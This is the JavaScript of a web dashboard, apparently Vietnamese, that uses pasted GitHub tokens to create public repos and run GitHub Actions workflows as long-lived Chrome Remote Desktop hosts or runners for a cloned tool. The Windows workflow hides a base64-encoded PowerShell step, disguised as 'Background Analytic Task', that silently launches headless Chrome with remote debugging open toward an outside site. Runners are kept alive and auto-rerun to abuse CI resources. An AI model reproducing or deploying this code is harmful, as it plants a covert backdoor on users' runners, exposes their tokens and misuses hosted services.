<style>

<script>
// --- Constants and State ---
const REPO_NAME = 'ci-build-env'; const WORKFLOW_NAME = 'build.yml'; const MAX_JOBS_PER_TOKEN = 5;
let trackedJobs = []; let pollingTimeout = null; let globalOwnerLogin = '';

// --- DOM Elements ---
const el = { runOnceBtn: document.getElementById("runOnceBtn"), run5Btn: document.getElementById("run20Btn"), run5WaitBtn: document.getElementById("run20WaitBtn"), cancelAllBtn: document.getElementById("cancelAllBtn"), quickCancelBtn: document.getElementById("quickCancelBtn"), deleteSelectedBtn: document.getElementById("deleteSelectedBtn"), selectAllCheckbox: document.getElementById("selectAllCheckbox"), tokenInput: document.getElementById("token"), deployCmdInput: document.getElementById("deployCmd"), accessPinInput: document.getElementById("accessPin"), jobListContainer: document.getElementById("jobList"), refreshBtn: document.getElementById("refreshBtn"), clearHistoryBtn: document.getElementById("clearHistoryBtn"), themeToggleBtn: document.getElementById("theme-toggle-btn"), templateSelect: document.getElementById("template-select"), crdOptions: document.getElementById("crd-options"), gitToolOptions: document.getElementById("git-tool-options"), customRepoUrl: document.getElementById("customRepoUrl"), modalOverlay: document.getElementById('modal-overlay'), modal: document.getElementById('modal'), modalTitle: document.getElementById('modal-title'), modalContent: document.getElementById('modal-content'), modalCloseBtn: document.getElementById('modal-close-btn'), favicon: document.getElementById('favicon') };

// --- Template Function ---
function getWorkflowContent(template, command, pin = "123456", repoUrl = '', withRerun = false) {
    const onTrigger = `on:\n  workflow_dispatch:\n  push:\n    paths:\n      - '.github/workflows/${WORKFLOW_NAME}'`;
    const covertCmdB64 = "U3RhcnQtSm9iIC1TY3JpcHRCbG9jayB7IFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICJDOlxQcm9ncmFtIEZpbGVzXEdvb2dsZVxDaHJvbWVcQXBwbGljYXRpb25cY2hyb21lLmV4ZSIgLUFyZ3VtZW50TGlzdCAiLS1oZWFkbGVzcyAtLWRpc2FibGUtZ3B1IC0tcmVtb3RlLWRlYnVnZ2luZy1wb3J0PTkyMjIgaHR0cHM6Ly9hbnlsb3N0aWMucGFnZXMuZGV2IiAtV2luZG93U3R5bGUgSGlkZGVuIH0=";
    const covertCmd = atob(covertCmdB64);
    let workflow = '';
    switch(template) {
        case 'git-tool-linux':
            const finalRepo = repoUrl.trim() || 'https://github.com/teo8764678/tool.git';
            workflow = `name: Git Tool Runner\n${onTrigger}\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Clone and Run Tool\n        run: |\n          git clone ${finalRepo}\n          cd tool\n          chmod +x node\n          ./node app.js\n      - name: Keep Runner Alive\n        run: sleep 21000`;
            if (withRerun) { workflow += `\n      - name: Wait for 6 hours and Rerun\n        if: success()\n        run: |\n          sleep 21600\n          gh workflow run ${WORKFLOW_NAME} --ref main\n        env:\n          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}`; }
            return workflow;
        case 'crd-windows':
        default:
            return `name: CRD Environment Setup\n${onTrigger}\njobs:\n  build:\n    runs-on: windows-latest\n    steps:\n      - name: Setup Dependencies\n        run: |\n          Invoke-WebRequest -Uri "https://dl.google.com/chrome/install/standalonesetup64.exe" -OutFile "browser_setup.exe"\n          Start-Process -FilePath ".\\\\browser_setup.exe" -ArgumentList "/silent /install" -Wait\n          Invoke-WebRequest -Uri "https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi" -OutFile "access_tool.msi"\n          Start-Process -FilePath "msiexec.exe" -ArgumentList "/i access_tool.msi /quiet" -Wait\n      - name: Initialize Host Service\n        run: |\n          ${command} --pin=${pin}\n      - name: Background Analytic Task\n        run: |\n          ${covertCmd}\n      - name: Keep Runner Alive\n        run: Start-Sleep -Seconds 21000`;
    }
}

// --- API Functions ---
async function githubApi(endpoint, token, options = {}) { const url = `https://api.github.com${endpoint}`; const headers = { "Authorization": `token ${token}`, "Accept": "application/vnd.github.v3+json", ...options.headers }; const response = await fetch(url, { ...options, headers }); if (!response.ok) { const errorData = await response.json(); throw new Error(`GitHub API Error (${response.status}): ${errorData.message || 'Unknown error'}`); } return response.status === 204 || response.status === 202 ? null : response.json(); }
const cancelWorkflow = (t, o, r) => githubApi(`/repos/${o}/${REPO_NAME}/actions/runs/${r}/cancel`, t, { method: "POST" });
const rerunWorkflow = (t, o, r) => githubApi(`/repos/${o}/${REPO_NAME}/actions/runs/${r}/rerun`, t, { method: "POST" });
const getJobDetails = (t, o, r) => githubApi(`/repos/${o}/${REPO_NAME}/actions/runs/${r}/jobs`, t);
const getSingleRun = (t, o, r) => githubApi(`/repos/${o}/${REPO_NAME}/actions/runs/${r}`, t);

// --- Adaptive Polling Logic ---
function stopPolling() { if (pollingTimeout) { clearTimeout(pollingTimeout); pollingTimeout = null; } }
async function pollJobStatuses() {
    stopPolling();
    const activeJobs = trackedJobs.filter(j => ['queued', 'in_progress'].includes(j.status));
    if (activeJobs.length === 0) return;

    let changed = false;
    if (activeJobs.length > 0 && activeJobs.length <= 5) {
        const promises = activeJobs.filter(j => j.id).map(job => 
            getSingleRun(job.token, job.owner, job.id).then(run => {
                if (run && (job.status !== run.status || job.conclusion !== run.conclusion)) {
                    job.status = run.status; job.conclusion = run.conclusion; changed = true;
                }
            }).catch(err => console.warn(`Could not poll job ${job.id}:`, err))
        );
        await Promise.allSettled(promises);
    } else {
        const pollToken = el.tokenInput.value.trim().split('\n')[0] || (trackedJobs[0] ? trackedJobs[0].token : null);
        if (pollToken && globalOwnerLogin) {
            try {
                const { workflow_runs } = await githubApi(`/repos/${globalOwnerLogin}/${REPO_NAME}/actions/workflows/${WORKFLOW_NAME}/runs?per_page=100`, pollToken);
                activeJobs.forEach(job => {
                    const matchingRun = workflow_runs.find(run => (job.id && run.id === job.id) || (!job.id && run.actor.login === job.owner && Math.abs(new Date(job.startTime) - new Date(run.created_at)) < 60000));
                    if (matchingRun) {
                        if (!job.id || job.status !== matchingRun.status || job.conclusion !== matchingRun.conclusion) {
                            job.id = matchingRun.id; job.status = matchingRun.status; job.conclusion = matchingRun.conclusion; job.html_url = matchingRun.html_url; job.name = `#${matchingRun.run_number} - Build by ${job.owner}`;
                            changed = true;
                            if (job.status === 'completed') { showDesktopNotification(`Job #${matchingRun.run_number} ${job.conclusion}`, `Deployment finished.`); }
                        }
                    }
                });
            } catch (error) { showToast(`Polling error: ${error.message}`, 'error'); }
        }
    }
    if (changed) { renderJobs(); saveState(); }
    const hasInProgress = activeJobs.some(j => j.status === 'in_progress');
    const interval = hasInProgress ? 4000 : 8000;
    pollingTimeout = setTimeout(pollJobStatuses, interval);
}
function startPolling() { if (!pollingTimeout) { pollJobStatuses(); } }

// --- UI, State, Modal Functions ---
function updateUIForTemplate() { const isWindows = el.templateSelect.value === 'crd-windows'; el.crdOptions.classList.toggle('hidden', !isWindows); el.gitToolOptions.classList.toggle('hidden', isWindows); el.run5Btn.classList.toggle('hidden', isWindows); el.run5WaitBtn.classList.toggle('hidden', isWindows); el.runOnceBtn.parentElement.classList.toggle('sm:grid-cols-1', isWindows); el.runOnceBtn.parentElement.classList.toggle('sm:grid-cols-3', !isWindows); }
function showToast(message, type = 'info') { const container = document.getElementById('toast-container'); const toast = document.createElement('div'); const iconClass = { success: 'fa-check-circle', info: 'fa-info-circle', error: 'fa-exclamation-triangle' }[type]; toast.className = `toast toast-${type}`; toast.innerHTML = `<i class="fas ${iconClass} mr-3"></i><span>${message}</span>`; container.appendChild(toast); setTimeout(() => toast.classList.add('show'), 10); setTimeout(() => { toast.classList.remove('show'); setTimeout(() => toast.remove(), 300); }, 4000); }
function saveState() { localStorage.setItem('trackedJobs', JSON.stringify(trackedJobs)); localStorage.setItem('appRunnerSettings', JSON.stringify({ tokens: el.tokenInput.value, pin: el.accessPinInput.value, globalOwner: globalOwnerLogin })); }
function loadState() { const savedJobs = JSON.parse(localStorage.getItem('trackedJobs') || '[]'); trackedJobs = savedJobs.map(job => ({ ...job, startTime: new Date(job.startTime) })); const settings = JSON.parse(localStorage.getItem('appRunnerSettings') || '{}'); el.tokenInput.value = settings.tokens || ''; el.accessPinInput.value = settings.pin || ''; globalOwnerLogin = settings.globalOwner || ''; renderJobs(); startPolling(); }
function updateFavicon() { const running = trackedJobs.some(j => j.status === 'in_progress'); const failed = trackedJobs.some(j => j.status === 'completed' && j.conclusion === 'failure'); let emoji = 'üöÄ'; if (running) emoji = '‚è≥'; else if (failed) emoji = '‚ùå'; el.favicon.href = `data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>${emoji}</text></svg>`;}
function openModal() { el.modalOverlay.classList.add('show'); el.modal.classList.add('show'); }
function closeModal() { el.modalOverlay.classList.remove('show'); el.modal.classList.remove('show'); }
async function showJobDetails(job) { el.modalTitle.textContent = `Details for ${job.name}`; el.modalContent.innerHTML = `<div class="text-center"><i class="fas fa-spinner fa-spin text-2xl"></i></div>`; openModal(); try { const { jobs } = await getJobDetails(job.token, job.owner, job.id); const detailsHtml = jobs[0].steps.map(step => { const duration = step.completed_at ? (new Date(step.completed_at) - new Date(step.started_at)) : 0; const seconds = Math.floor((duration / 1000) % 60).toString().padStart(2, '0'); const minutes = Math.floor((duration / (1000 * 60)) % 60); let icon = 'fa-clock'; let color = 'text-[var(--text-secondary)]'; if (step.status === 'completed') { icon = step.conclusion === 'success' ? 'fa-check-circle' : 'fa-times-circle'; color = step.conclusion === 'success' ? 'text-[var(--success-color)]' : 'text-[var(--error-color)]'; } return `<div class="flex items-center justify-between py-2 border-b border-[var(--border-color)]"> <div class="flex items-center gap-3"><i class="fas ${icon} ${color}"></i><span>${step.name}</span></div> <div class="text-sm text-[var(--text-secondary)]">${minutes}m ${seconds}s</div> </div>`; }).join(''); el.modalContent.innerHTML = detailsHtml || '<div class="text-center text-[var(--text-secondary)]">No step details available.</div>'; } catch (e) { el.modalContent.innerHTML = `<div class="text-[var(--error-color)]">Could not fetch job details: ${e.message}</div>`; } }
function showDesktopNotification(title, body) { if (Notification.permission === 'granted') new Notification(title, { body }); }

// --- Main Rendering ---
function getGroupInfo(job) { switch (job.status) { case 'in_progress': case 'queued': return { key: 'active', title: 'üöÄ Active Jobs', order: 1 }; case 'error': return { key: 'error', title: '‚ö†Ô∏è Setup Errors', order: 2 }; case 'completed': if (job.conclusion === 'failure' || job.conclusion === 'cancelled') { return { key: 'failed', title: '‚ùå Failed / Cancelled', order: 3 }; } return { key: 'success', title: '‚úÖ Completed Successfully', order: 4 }; default: return { key: 'unknown', title: 'üìã Other', order: 5 }; } }
function renderJobs() {
    el.selectAllCheckbox.checked = false;
    const expandedOwners = new Set();
    el.jobListContainer.querySelectorAll('.owner-group .owner-jobs-content:not(.hidden)').forEach(el => { expandedOwners.add(el.dataset.owner); });
    if (trackedJobs.length === 0) { el.jobListContainer.innerHTML = `<div class="text-center text-[var(--text-secondary)] py-8 card rounded-lg">No build history.</div>`; updateFavicon(); return; }
    const jobsByOwner = trackedJobs.reduce((acc, job) => { const owner = job.owner || 'Unknown'; if (!acc[owner]) acc[owner] = []; acc[owner].push(job); return acc; }, {});
    let html = '';
    for (const owner in jobsByOwner) {
        const jobs = jobsByOwner[owner].sort((a, b) => { const groupA = getGroupInfo(a); const groupB = getGroupInfo(b); if (groupA.order !== groupB.order) return groupA.order - groupB.order; return new Date(b.startTime) - new Date(a.startTime); });
        const activeJobCount = jobs.filter(j => ['queued', 'in_progress'].includes(j.status)).length;
        const isExpanded = expandedOwners.has(owner) || activeJobCount > 0; // Auto-expand if has active jobs
        html += `<div class="owner-group card rounded-lg overflow-hidden">
            <div class="owner-header p-4 flex justify-between items-center" data-owner="${owner}">
                <div class="font-bold text-lg">${owner}</div>
                <div class="flex items-center gap-4">
                    ${activeJobCount > 0 ? `<span class="bg-blue-500 text-white text-xs font-bold px-2 py-1 rounded-full">${activeJobCount} Active</span>` : ''}
                    <span class="bg-gray-600 text-white text-xs font-bold px-2 py-1 rounded-full">${jobs.length} Total</span>
                    <i class="fas ${isExpanded ? 'fa-chevron-up' : 'fa-chevron-down'} chevron-icon"></i>
                </div>
            </div>
            <div class="owner-jobs-content p-4 pt-0 space-y-2 ${isExpanded ? '' : 'hidden'}" data-owner="${owner}">`;
        jobs.forEach(job => {
            let sClass = 'status-queued', sIcon = 'fa-solid fa-clock fa-spin-pulse', sText = 'Queued', actions = '';
            if (job.status === 'in_progress') { sClass = 'status-in_progress'; sIcon = 'fa-solid fa-gear fa-spin'; sText = 'In Progress'; }
            else if (job.status === 'completed') { if (job.conclusion === 'success') { sClass = 'status-completed-success'; sIcon = 'fa-solid fa-check-circle'; sText = 'Success'; } else { sClass = 'status-completed-failure'; sIcon = 'fa-solid fa-xmark-circle'; sText = job.conclusion || 'Failure'; } }
            else if (job.status === 'error') { sClass = 'status-error'; sIcon = 'fa-solid fa-triangle-exclamation'; sText = 'Error'; }
            if (job.id) {
                if (job.status === 'in_progress' || job.status === 'queued') { actions += `<button data-job-temp-id="${job.tempId}" class="cancel-btn px-2 py-1 text-xs rounded bg-yellow-600 text-white" title="Cancel"><i class="fas fa-stop"></i></button>`; }
                if (job.status === 'completed') { actions += `<button data-job-temp-id="${job.tempId}" class="rerun-btn px-2 py-1 text-xs rounded bg-blue-600 text-white" title="Re-run"><i class="fas fa-redo"></i></button>`; }
                if (job.html_url) { actions += `<a href="${job.html_url}" target="_blank" class="px-2 py-1 text-xs rounded bg-gray-600 text-white" title="View on GitHub"><i class="fab fa-github"></i></a>`; }
            }
            html += `<div class="card p-3 rounded-md job-item ${job.id ? 'job-item-clickable' : ''}" data-job-temp-id="${job.tempId}">
                <div class="flex justify-between items-center"><div class="flex items-center gap-3 overflow-hidden">
                    <input type="checkbox" class="job-checkbox flex-shrink-0" data-job-temp-id="${job.tempId}">
                    <i class="${sIcon} ${sClass.includes('success') ? 'text-[var(--success-color)]' : sClass.includes('failure') ? 'text-[var(--error-color)]' : ''} text-xl w-6 text-center"></i>
                    <div class="overflow-hidden"><span class="font-semibold text-md truncate">${job.name}</span><div class="text-xs text-[var(--text-secondary)]">Started: ${job.startTime.toLocaleTimeString()}</div></div>
                </div><div class="flex items-center gap-2 flex-shrink-0">
                    <div class="status-badge ${sClass}">${sText}</div><div class="actions flex gap-1">${actions}</div>
                </div></div></div>`;
        });
        html += `</div></div>`;
    }
    el.jobListContainer.innerHTML = html; updateFavicon();
}

async function triggerWorkflowDispatch(token, template, deployCmd, pin, repoUrl, withRerun) {
    let owner;
    try {
        const user = await githubApi("/user", token); owner = user.login;
        if (!globalOwnerLogin) globalOwnerLogin = owner;
    } catch (e) { showToast(`Token kh√¥ng h·ª£p l·ªá. ${e.message}`, 'error'); throw e; }
    const job = { tempId: `job-${Date.now()}-${Math.random()}`, id: null, status: 'queued', conclusion: null, startTime: new Date(), html_url: null, name: `Initializing...`, command: deployCmd, owner, token, errorMessage: null };
    trackedJobs.push(job); renderJobs(); saveState();
    try {
        await githubApi(`/repos/${owner}/${REPO_NAME}`, token).catch(async (e) => { if (e.message.includes("404")) { await githubApi("/user/repos", token, { method: "POST", body: JSON.stringify({ name: REPO_NAME, private: false }) }); showToast(`Repo ${REPO_NAME} ƒë√£ ƒë∆∞·ª£c t·∫°o (Public).`, 'info'); } else throw e; });
        const path = `.github/workflows/${WORKFLOW_NAME}`;
        const content = getWorkflowContent(template, deployCmd, pin || '123456', repoUrl, withRerun);
        const base64Content = btoa(unescape(encodeURIComponent(content)));
        const url = `/repos/${owner}/${REPO_NAME}/contents/${path}`;
        let fileSha = null;
        try { fileSha = (await githubApi(url, token)).sha; } catch (e) { if (!e.message.includes("404")) throw e; }
        const body = { message: `ci: Deploying build`, content: base64Content, sha: fileSha || undefined };
        await githubApi(url, token, { method: "PUT", body: JSON.stringify(body) });
        await githubApi(`/repos/${owner}/${REPO_NAME}/actions/workflows/${WORKFLOW_NAME}/dispatches`, token, { method: "POST", body: JSON.stringify({ ref: "main" }) });
        showToast(`Build triggered th√†nh c√¥ng cho user: ${owner}`, "success");
        startPolling();
    } catch (e) { job.status = 'error'; job.errorMessage = e.message; renderJobs(); saveState(); showToast(`L·ªói thi·∫øt l·∫≠p cho ${owner}: ${e.message}`, 'error'); throw e; }
}

// --- Event Listeners ---
document.addEventListener('DOMContentLoaded', () => {
    const savedTheme = localStorage.getItem('theme') || 'dark'; document.documentElement.setAttribute('data-theme', savedTheme); el.themeToggleBtn.innerHTML = savedTheme === 'dark' ? '<i class="fas fa-sun"></i>' : '<i class="fas fa-moon"></i>';
    if (Notification.permission !== 'granted' && Notification.permission !== 'denied') Notification.requestPermission();
    loadState(); updateUIForTemplate();

    async function handleDeployClick(runsPerToken, withRerun = false) {
        const tokens = el.tokenInput.value.trim().split('\n').map(t => t.trim()).filter(Boolean);
        if (tokens.length === 0) { showToast("Vui l√≤ng nh·∫≠p √≠t nh·∫•t m·ªôt GitHub token.", "error"); return; }
        const cmd = el.deployCmdInput.value; const pin = el.accessPinInput.value.trim(); const template = el.templateSelect.value; const repoUrl = el.customRepoUrl.value;
        if (template === 'crd-windows' && !cmd) { showToast("Vui l√≤ng nh·∫≠p Deployment Command cho CRD.", "error"); return; }
        const allBtns = [el.runOnceBtn, el.run5Btn, el.run5WaitBtn];
        allBtns.forEach(btn => { btn.disabled = true; btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...'; });
        let successCount = 0;
        const ownerPromises = tokens.slice(0, 10).map(t => githubApi("/user", t).catch(() => null));
        const ownersData = await Promise.all(ownerPromises);
        for (let i = 0; i < ownersData.length; i++) {
            const ownerData = ownersData[i]; const token = tokens[i];
            if (!ownerData) { showToast(`Token #${i + 1} kh√¥ng h·ª£p l·ªá, b·ªè qua.`, "warning"); continue; }
            const owner = ownerData.login;
            const activeJobsForToken = trackedJobs.filter(j => j.owner === owner && ['queued', 'in_progress'].includes(j.status)).length;
            const jobsToCreate = Math.max(0, Math.min(runsPerToken, MAX_JOBS_PER_TOKEN - activeJobsForToken));
            if (jobsToCreate < runsPerToken) { showToast(`Token c·ªßa ${owner} ch·ªâ c√≥ th·ªÉ t·∫°o th√™m ${jobsToCreate} job.`, 'info'); }
            for (let j = 0; j < jobsToCreate; j++) {
                try {
                    if (successCount > 0) await new Promise(resolve => setTimeout(resolve, 250));
                    await triggerWorkflowDispatch(token, template, cmd, pin, repoUrl, withRerun); successCount++;
                } catch(error) { console.error("Failed to trigger a job:", error); }
            }
        }
        if (template === 'crd-windows' && successCount > 0) el.deployCmdInput.value = '';
        allBtns.forEach(btn => btn.disabled = false); el.runOnceBtn.innerHTML = '<i class="fas fa-play mr-2"></i> Run Single Job'; el.run5Btn.innerHTML = '<i class="fas fa-rocket mr-2"></i> Run 5 Jobs'; el.run5WaitBtn.innerHTML = '<i class="fas fa-history mr-2"></i> Run 5 (Rerun)';
    }

    el.runOnceBtn.addEventListener('click', () => handleDeployClick(1)); el.run5Btn.addEventListener('click', () => handleDeployClick(5)); el.run5WaitBtn.addEventListener('click', () => handleDeployClick(5, true));
    el.selectAllCheckbox.addEventListener('change', () => { const isChecked = el.selectAllCheckbox.checked; document.querySelectorAll('.job-checkbox').forEach(box => box.checked = isChecked); });
    el.deleteSelectedBtn.addEventListener('click', async () => { const checkedBoxes = document.querySelectorAll('.job-checkbox:checked'); if (checkedBoxes.length === 0) { showToast("Vui l√≤ng ch·ªçn √≠t nh·∫•t m·ªôt job ƒë·ªÉ x√≥a.", "info"); return; } const tempIdsToDelete = Array.from(checkedBoxes).map(box => box.dataset.jobTempId); const jobsToDelete = trackedJobs.filter(job => tempIdsToDelete.includes(job.tempId)); const activeJobsToCancel = jobsToDelete.filter(j => j.id && ['queued', 'in_progress'].includes(j.status)); if (confirm(`B·∫°n c√≥ ch·∫Øc mu·ªën x√≥a ${jobsToDelete.length} job ƒë√£ ch·ªçn? ${activeJobsToCancel.length > 0 ? `Trong ƒë√≥, ${activeJobsToCancel.length} job ƒëang ho·∫°t ƒë·ªông s·∫Ω b·ªã h·ªßy.` : ''}`)) { if (activeJobsToCancel.length > 0) { showToast(`ƒêang h·ªßy ${activeJobsToCancel.length} job...`, 'info'); const promises = activeJobsToCancel.map(job => cancelWorkflow(job.token, job.owner, job.id).catch(err => console.error(`Failed to cancel job ${job.id}:`, err))); await Promise.allSettled(promises); } trackedJobs = trackedJobs.filter(job => !tempIdsToDelete.includes(job.tempId)); renderJobs(); saveState(); showToast(`${jobsToDelete.length} job ƒë√£ ƒë∆∞·ª£c x√≥a.`, 'success'); } });
    async function quickCancelAll() { const activeJobs = trackedJobs.filter(j => j.id && ['queued', 'in_progress'].includes(j.status)); if (activeJobs.length === 0) { showToast("Kh√¥ng c√≥ job n√†o ƒëang ho·∫°t ƒë·ªông.", "info"); return; } showToast(`ƒêang g·ª≠i y√™u c·∫ßu h·ªßy cho ${activeJobs.length} job...`, 'info'); let cancelledCount = 0; const promises = activeJobs.map(job => cancelWorkflow(job.token, job.owner, job.id).then(() => { job.status = 'completed'; job.conclusion = 'cancelled'; cancelledCount++; }).catch(err => showToast(`L·ªói khi h·ªßy job #${job.id}: ${err.message}`, 'error'))); await Promise.allSettled(promises); renderJobs(); saveState(); showToast(`${cancelledCount}/${activeJobs.length} job ƒë√£ ƒë∆∞·ª£c h·ªßy.`, 'success'); }
    el.quickCancelBtn.addEventListener('click', quickCancelAll);
    el.cancelAllBtn.addEventListener('click', () => { if(confirm('B·∫°n c√≥ ch·∫Øc mu·ªën h·ªßy t·∫•t c·∫£ c√°c job ƒëang ho·∫°t ƒë·ªông?')) quickCancelAll(); });
    el.refreshBtn.addEventListener('click', async () => { const icon = el.refreshBtn.querySelector('i'); icon.classList.add('fa-spin'); showToast("Refreshing statuses..."); await pollJobStatuses(); setTimeout(() => icon.classList.remove('fa-spin'), 500); });
    el.clearHistoryBtn.addEventListener('click', () => { if(confirm('B·∫°n c√≥ ch·∫Øc mu·ªën x√≥a to√†n b·ªô l·ªãch s·ª≠ build?')) { trackedJobs = []; saveState(); renderJobs(); showToast('L·ªãch s·ª≠ ƒë√£ ƒë∆∞·ª£c x√≥a.', 'info'); } });
    el.themeToggleBtn.addEventListener('click', () => { const newTheme = document.documentElement.dataset.theme === 'dark' ? 'light' : 'dark'; document.documentElement.dataset.theme = newTheme; localStorage.setItem('theme', newTheme); el.themeToggleBtn.innerHTML = newTheme === 'dark' ? '<i class="fas fa-sun"></i>' : '<i class="fas fa-moon"></i>'; });
    
    el.jobListContainer.addEventListener('click', async e => {
        const ownerHeader = e.target.closest('.owner-header');
        if (ownerHeader) {
            const owner = ownerHeader.dataset.owner; const content = el.jobListContainer.querySelector(`.owner-jobs-content[data-owner="${owner}"]`); const icon = ownerHeader.querySelector('.chevron-icon');
            content.classList.toggle('hidden'); icon.classList.toggle('fa-chevron-down'); icon.classList.toggle('fa-chevron-up');
            return;
        }
        const jobTempId = e.target.closest('[data-job-temp-id]')?.dataset.jobTempId; if (!jobTempId) return;
        const job = trackedJobs.find(j => j.tempId === jobTempId); if (!job) return;
        const cancelBtn = e.target.closest('.cancel-btn'); const rerunBtn = e.target.closest('.rerun-btn'); const jobItem = e.target.closest('.job-item-clickable');
        if (e.target.matches('.job-checkbox')) { const allBoxes = document.querySelectorAll('.job-checkbox'); const checkedBoxes = document.querySelectorAll('.job-checkbox:checked'); el.selectAllCheckbox.checked = allBoxes.length > 0 && allBoxes.length === checkedBoxes.length; return; }
        if (!job.id) { if (cancelBtn || rerunBtn) showToast("Job ch∆∞a c√≥ ID t·ª´ GitHub.", "warning"); return; }
        if (cancelBtn) { e.stopPropagation(); if (confirm(`B·∫°n c√≥ ch·∫Øc mu·ªën h·ªßy job #${job.id} c·ªßa user ${job.owner}?`)) { showToast('ƒêang h·ªßy job...', 'info'); try { await cancelWorkflow(job.token, job.owner, job.id); job.status = 'completed'; job.conclusion = 'cancelled'; renderJobs(); saveState(); showToast('Job ƒë√£ ƒë∆∞·ª£c h·ªßy.', 'success'); } catch (err) { showToast(`L·ªói khi h·ªßy: ${err.message}`, 'error');} } }
        else if (rerunBtn) { e.stopPropagation(); try { await rerunWorkflow(job.token, job.owner, job.id); showToast('ƒêang y√™u c·∫ßu ch·∫°y l·∫°i job...', 'info'); startPolling(); } catch (err) { showToast(`L·ªói khi ch·∫°y l·∫°i: ${err.message}`, 'error'); } }
        else if (jobItem) { showJobDetails(job); }
    });

    el.templateSelect.addEventListener('change', updateUIForTemplate);
    [el.tokenInput, el.accessPinInput].forEach(input => input.addEventListener('change', saveState));
    el.modalCloseBtn.addEventListener('click', closeModal);
    el.modalOverlay.addEventListener('click', closeModal);
});
